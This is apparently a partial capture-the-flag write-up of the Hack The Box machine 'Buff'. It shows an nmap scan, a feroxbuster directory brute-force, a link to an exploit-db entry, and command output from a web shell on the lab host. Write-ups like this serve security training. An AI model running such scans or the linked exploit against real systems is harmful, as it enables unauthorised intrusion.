

### Tools:

### Vulnerabilities: 


```
└─$ nmap -A -p- -T4 -Pn 10.129.2.18
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-17 15:56 CDT
Nmap scan report for Buff.htb (10.129.2.18)
Host is up (0.14s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: mrb3n's Bro Hut
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 505.48 seconds
```
```console
└─$ feroxbuster -u http://Buff.htb:8080/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git,pdf -q
301      GET        9l       30w      337c http://buff.htb:8080/include => http://buff.htb:8080/include/
301      GET        9l       30w      333c http://buff.htb:8080/img => http://buff.htb:8080/img/
200      GET      133l      308w     4969c http://buff.htb:8080/
302      GET        0l        0w        0c http://buff.htb:8080/include/logout.php => ../index.php
403      GET       42l       97w        0c http://buff.htb:8080/.html
200      GET        4l       20w      137c http://buff.htb:8080/register.php
301      GET        9l       30w      336c http://buff.htb:8080/upload => http://buff.htb:8080/upload/
200      GET      118l      265w     4169c http://buff.htb:8080/contact.php
200      GET        2l       12w      107c http://buff.htb:8080/upload.php
200      GET        2l       18w      143c http://buff.htb:8080/home.php
200      GET      141l      433w     5337c http://buff.htb:8080/about.php
403      GET       42l       97w        0c http://buff.htb:8080/webalizer
301      GET        9l       30w      337c http://buff.htb:8080/profile => http://buff.htb:8080/profile/
200      GET      133l      308w     4969c http://buff.htb:8080/index.php
403      GET       45l      113w        0c http://buff.htb:8080/phpmyadmin
301      GET        9l       30w      344c http://buff.htb:8080/profile/upload => http://buff.htb:8080/profile/upload/
200      GET        0l        0w        0c http://buff.htb:8080/include/functions.php
200      GET      121l      278w     4282c http://buff.htb:8080/edit.php
200      GET        2l       14w      132c http://buff.htb:8080/profile/index.php
200      GET      113l      268w     4252c http://buff.htb:8080/feedback.php
200      GET      168l      486w     7791c http://buff.htb:8080/packages.php
```

https://www.exploit-db.com/exploits/48506



```console
C:\xampp\htdocs\gym\upload> whoami
�PNG
�
buff\shaun
```



```console
C:\xampp\htdocs\gym\upload> net user shaun
�PNG
�
User name                    shaun
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            16/06/2020 15:08:08
Password expires             Never
Password changeable          16/06/2020 15:08:08
Password required            No
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   16/06/2020 22:38:46

Logon hours allowed          All

Local Group Memberships      *Users                
Global Group memberships     *None                 
The command completed successfully.
```
